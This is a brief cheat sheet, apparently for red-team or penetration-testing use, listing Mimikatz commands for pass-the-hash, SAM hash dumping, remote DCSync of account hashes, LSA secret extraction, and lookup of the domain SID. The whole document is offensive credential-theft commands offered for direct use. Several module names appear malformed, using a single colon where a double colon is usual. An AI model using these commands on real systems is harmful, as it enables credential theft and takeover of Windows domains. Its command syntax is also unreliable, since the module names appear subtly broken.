# Mimikatz
## MIMIKATZ CREDENTIAL MANIPULATION
| Description | Command |
|-------------|---------|
| Mimikatz PTH (Runs specified binary with PTH credentials). Must be run as SYSTEM | `mimikatz.exe "sekurlsa:pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:<FILE_PATH>" exit` |
| Mimikatz hashdump. Must be run as SYSTEM | `mimikatz.exe "lsadump:sam" exit` |
| PTH with AES128/256 bit keys. AES128/256 bit keys can be obtained via DCSync | `mimikatz.exe sekurlsa:pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /aes128:<AES128_HASH> /aes256:<AES256_HASH>` |
| Extract domain SID from Active Directory object | `wmic group where name="Domain Admins" get name,sid,domain`<br>or<br>`reg query HKU to retrieve logged in domain user SIDs (which contain domain SID)`<br><br>Result of above commands:<br>S-1-5-21-520640528-869697576-4233872597-1532<br><br>The Domain SID Portion Is:<br>S-1-5-21-520640528-869697576-4233872597 |
| Remote dump hash for specific user account (Administrators, Domain Admins, or Enterprise Admins are able to remotely DCSync) | `mimikatz.exe "lsadump:dcsync /domain:<DOMAIN_FQDN> /user:<USERNAME>"` |
| Get the SysKey to decrypt SECRETS entries (from registry or hives) | `mimikatz.exe "lsadump:secrets"` |
